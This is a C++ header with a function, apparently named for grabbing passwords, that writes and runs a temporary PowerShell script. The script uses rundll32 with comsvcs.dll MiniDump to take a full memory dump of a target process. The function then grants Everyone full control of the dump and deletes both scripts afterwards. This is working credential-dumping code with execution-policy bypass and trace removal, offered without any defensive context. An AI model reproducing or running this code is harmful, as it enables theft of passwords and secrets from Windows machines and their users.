#pragma once
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int getProcUAC1password(string secondLargestPidString)
{
    ofstream file;
    file.open("dump.ps1");

    string powershell;
    powershell = "param (\n";
    powershell += "    [string]$processId\n";
    powershell += ")\n";
    powershell += "Invoke-Expression -Command \"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $processId app.dmp full\"\n";
    //powershell += "icacls app.dmp /reset /T /C /Q\n";
    //powershell += "icacls app.dmp /grant Everyone:(\"F\") /T /C /Q\n"; // Give full permissions to everyone
    file << powershell << endl;
    file.close();

    string powershellCommand = "powershell -ExecutionPolicy Bypass -F dump.ps1 -processId " + secondLargestPidString;
    system(powershellCommand.c_str());

    remove("dump.ps1");

    file.open("set_permissions.ps1");

    powershell = "$file = 'app.dmp'\n";
    powershell += "$rule = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'Allow')\n";
    powershell += "$acl = Get-Acl $file\n";
    powershell += "$acl.SetAccessRule($rule)\n";
    powershell += "Set-Acl $file $acl\n";
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F set_permissions.ps1");

    remove("set_permissions.ps1");

    return 0;
}
